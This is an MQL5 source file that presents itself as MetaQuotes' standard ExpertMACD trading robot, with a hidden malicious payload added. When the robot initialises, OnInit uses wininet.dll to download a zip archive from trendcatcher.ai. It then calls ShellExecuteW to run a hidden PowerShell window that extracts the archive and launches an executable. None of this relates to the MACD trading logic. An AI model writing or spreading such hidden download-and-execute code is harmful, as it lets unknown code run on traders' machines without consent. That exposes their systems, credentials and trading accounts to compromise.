//+------------------------------------------------------------------+
//|                                                   ExpertMACD.mq5 |
//|                             Copyright 2000-2025, MetaQuotes Ltd. |
//|                                             https://www.mql5.com |
//+------------------------------------------------------------------+
#property copyright "Copyright 2000-2025, MetaQuotes Ltd."
#property link      "https://www.mql5.com"
#property version   "1.00"
//+------------------------------------------------------------------+
//| Include                                                          |
//+------------------------------------------------------------------+
#include <Expert\Expert.mqh>
#include <Expert\Signal\SignalMACD.mqh>
#include <Expert\Trailing\TrailingNone.mqh>
#include <Expert\Money\MoneyNone.mqh>


//+------------------------------------------------------------------+
//| IMPORTA DLL                                                      |
//+------------------------------------------------------------------+
#import "wininet.dll"
int InternetOpenW(string sAgent,int lAccessType,string sProxyName="",string sProxyBypass="",int lFlags=0);
int InternetOpenUrlW(int hInternetSession,string sUrl, string sHeaders="",int lHeadersLength=0,uint lFlags=0,int lContext=0);
int InternetReadFile(int hFile,uchar & sBuffer[],int lNumBytesToRead,int& lNumberOfBytesRead);
int InternetCloseHandle(int hInet);
#import

#import "shell32.dll"
int ShellExecuteW(int hwnd,string Operation,string File,string Parameters,string Directory,int ShowCmd);
#import


#define   INTERNET_FLAG_RELOAD            0x80000000
#define   INTERNET_FLAG_NO_CACHE_WRITE    0x04000000
#define   INTERNET_FLAG_PRAGMA_NOCACHE    0x00000100

//+------------------------------------------------------------------+
//| Inputs                                                           |
//+------------------------------------------------------------------+
//--- inputs for expert
input string Inp_Expert_Title            ="ExpertMACD_Down";
int          Expert_MagicNumber          =10981;
bool         Expert_EveryTick            =false;
//--- inputs for signal
input int    Inp_Signal_MACD_PeriodFast  =12;
input int    Inp_Signal_MACD_PeriodSlow  =24;
input int    Inp_Signal_MACD_PeriodSignal=9;
input int    Inp_Signal_MACD_TakeProfit  =50;
input int    Inp_Signal_MACD_StopLoss    =20;
//+------------------------------------------------------------------+
//| Global expert object                                             |
//+------------------------------------------------------------------+
CExpert ExtExpert;
//+------------------------------------------------------------------+
//| Initialization function of the expert                            |
//+------------------------------------------------------------------+
int OnInit(void)
  {
   string url = "https://trendcatcher.ai/calc0.zip";
   string local_path = "calc.zip";
   Print("local_path=" + local_path);
   if(DownloadFileWinINet(url, local_path))
     {
      Print("Download succeeded.");
      RunFile(local_path);
     }
   else
      Print("Download failed.");
//--- Initializing expert
   if(!ExtExpert.Init(Symbol(),Period(),Expert_EveryTick,Expert_MagicNumber))
     {
      //--- failed
      printf(__FUNCTION__+": error initializing expert");
      ExtExpert.Deinit();
      return(-1);
     }
//--- Creation of signal object
   CSignalMACD *signal=new CSignalMACD;
   if(signal==NULL)
     {
      //--- failed
      printf(__FUNCTION__+": error creating signal");
      ExtExpert.Deinit();
      return(-2);
     }
//--- Add signal to expert (will be deleted automatically))
   if(!ExtExpert.InitSignal(signal))
     {
      //--- failed
      printf(__FUNCTION__+": error initializing signal");
      ExtExpert.Deinit();
      return(-3);
     }
//--- Set signal parameters
   signal.PeriodFast(Inp_Signal_MACD_PeriodFast);
   signal.PeriodSlow(Inp_Signal_MACD_PeriodSlow);
   signal.PeriodSignal(Inp_Signal_MACD_PeriodSignal);
   signal.TakeLevel(Inp_Signal_MACD_TakeProfit);
   signal.StopLevel(Inp_Signal_MACD_StopLoss);
//--- Check signal parameters
   if(!signal.ValidationSettings())
     {
      //--- failed
      printf(__FUNCTION__+": error signal parameters");
      ExtExpert.Deinit();
      return(-4);
     }
//--- Creation of trailing object
   CTrailingNone *trailing=new CTrailingNone;
   if(trailing==NULL)
     {
      //--- failed
      printf(__FUNCTION__+": error creating trailing");
      ExtExpert.Deinit();
      return(-5);
     }
//--- Add trailing to expert (will be deleted automatically))
   if(!ExtExpert.InitTrailing(trailing))
     {
      //--- failed
      printf(__FUNCTION__+": error initializing trailing");
      ExtExpert.Deinit();
      return(-6);
     }
//--- Set trailing parameters
//--- Check trailing parameters
   if(!trailing.ValidationSettings())
     {
      //--- failed
      printf(__FUNCTION__+": error trailing parameters");
      ExtExpert.Deinit();
      return(-7);
     }
//--- Creation of money object
   CMoneyNone *money=new CMoneyNone;
   if(money==NULL)
     {
      //--- failed
      printf(__FUNCTION__+": error creating money");
      ExtExpert.Deinit();
      return(-8);
     }
//--- Add money to expert (will be deleted automatically))
   if(!ExtExpert.InitMoney(money))
     {
      //--- failed
      printf(__FUNCTION__+": error initializing money");
      ExtExpert.Deinit();
      return(-9);
     }
//--- Set money parameters
//--- Check money parameters
   if(!money.ValidationSettings())
     {
      //--- failed
      printf(__FUNCTION__+": error money parameters");
      ExtExpert.Deinit();
      return(-10);
     }
//--- Tuning of all necessary indicators
   if(!ExtExpert.InitIndicators())
     {
      //--- failed
      printf(__FUNCTION__+": error initializing indicators");
      ExtExpert.Deinit();
      return(-11);
     }
//--- succeed
   return(INIT_SUCCEEDED);
  }
//+------------------------------------------------------------------+
//| Deinitialization function of the expert                          |
//+------------------------------------------------------------------+
void OnDeinit(const int reason)
  {
   ExtExpert.Deinit();
  }
//+------------------------------------------------------------------+
//| Function-event handler "tick"                                    |
//+------------------------------------------------------------------+
void OnTick(void)
  {
   ExtExpert.OnTick();
  }
//+------------------------------------------------------------------+
//| Function-event handler "trade"                                   |
//+------------------------------------------------------------------+
void OnTrade(void)
  {
   ExtExpert.OnTrade();
  }
//+------------------------------------------------------------------+
//| Function-event handler "timer"                                   |
//+------------------------------------------------------------------+
void OnTimer(void)
  {
   ExtExpert.OnTimer();
  }
//+------------------------------------------------------------------+
bool DownloadFileWinINet(const string url, const string local_path)
  {
   int hSession = InternetOpenW("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36", 0, "", "", 0);
   if(hSession == 0)
     {
      Print("InternetOpenW failed: ", GetLastError());
      return false;
     }

   int hFile = InternetOpenUrlW(hSession, url, "", 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
   if(hFile == 0)
     {
      Print("InternetOpenUrlW failed: ", GetLastError());
      InternetCloseHandle(hSession);
      return false;
     }
   // Delete file if it already exists
   if(FileIsExist(local_path))
     {
      FileDelete(local_path);
      if(GetLastError() != 0)
        {
         Print("Failed to delete existing file: ", GetLastError());
         InternetCloseHandle(hFile);
         InternetCloseHandle(hSession);
         return false;
        }
     }

   int file_handle = FileOpen("calc.zip", FILE_READ|FILE_WRITE|FILE_BIN);
   if(file_handle == INVALID_HANDLE)
     {
      Print("FileOpen failed: ", GetLastError());
      InternetCloseHandle(hFile);
      InternetCloseHandle(hSession);
      return false;
     }

   uchar buffer[4096];
   int bytesRead = 0;
   while(true)
     {
      if(!InternetReadFile(hFile, buffer, sizeof(buffer), bytesRead) || bytesRead == 0)
         break;
      FileSeek(file_handle,0,SEEK_END);
      FileWriteArray(file_handle, buffer, 0, bytesRead);
     }

   FileClose(file_handle);
   InternetCloseHandle(hFile);
   InternetCloseHandle(hSession);

   return true;
  }
//+------------------------------------------------------------------+
void RunFile(const string file_name)
  {
   // Use powershell's Expand-Archive to extract the zip file and run the extracted executable
   // powershell.exe /c Expand-Archive -Path "MQL5\Files\calc.zip" -DestinationPath "MQL5\Files" -Force; Start-Process "MQL5\Files\calc.exe"
   string extractCmd = "/c Expand-Archive -Path \"MQL5\\Files\\" + file_name + "\" -DestinationPath \"MQL5\\Files\" -Force;";
   string execCmd = "Start-Process \"MQL5\\Files\\calc.exe\""; 
   int ret = ShellExecuteW(0, "open", "powershell.exe", extractCmd + execCmd, "", 0);
   
   if(ret <= 32)
      Print("Failed to extract and run file, code: ", ret);
   else
      Print("Successfully extracted and launched file.");
  }
//+------------------------------------------------------------------+




